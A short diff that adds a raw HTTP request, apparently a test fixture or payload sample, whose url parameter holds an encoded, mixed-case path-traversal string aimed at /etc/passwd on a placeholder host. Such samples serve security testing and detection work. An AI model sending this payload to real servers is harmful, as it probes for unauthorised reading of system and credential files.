@@ -1,0 +1,4 @@
+GET /a?url=..%2f..%2F..%2fEtC%2fPaSsWd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
